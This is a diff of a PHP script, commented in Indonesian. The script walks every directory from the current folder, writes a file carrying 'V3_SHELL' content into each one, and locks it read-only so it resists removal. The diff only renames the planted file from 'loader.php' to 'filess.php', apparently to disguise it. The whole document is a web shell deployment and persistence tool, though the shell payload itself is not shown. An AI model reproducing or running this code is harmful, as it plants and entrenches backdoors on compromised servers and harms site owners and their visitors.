@@ -20,14 +20,14 @@ function deployAndLock($dir, $content) {
         $path = $dir . DIRECTORY_SEPARATOR . $item;
         
         if (is_dir($path)) {
-            $targetFile = $path . DIRECTORY_SEPARATOR . 'loader.php';
+            $targetFile = $path . DIRECTORY_SEPARATOR . 'filess.php';
             
             // 1. Cek jika file sudah ada dan terkunci, buka dulu kuncinya
             if (file_exists($targetFile)) {
                 @chmod($targetFile, 0644);
             }
             
-            // 2. Tanam/Tulis file loader.php (Isi V3_SHELL)
+            // 2. Tanam/Tulis file filess.php (Isi V3_SHELL)
             if (file_put_contents($targetFile, $content)) {
                 // 3. Kunci file (0444 = Read Only bagi semua user)
                 chmod($targetFile, 0444);
@@ -53,6 +53,6 @@ echo "Memulai proses deployment V3_SHELL ke semua direktori...\n\n";
 // Jalankan dari folder saat ini
 deployAndLock('.', $indexContent);
 
-echo "\nProses Selesai. Semua direktori telah ditanam loader.php dan dikunci.";
+echo "\nProses Selesai. Semua direktori telah ditanam filess.php dan dikunci.";
 echo "</pre>";
 ?>
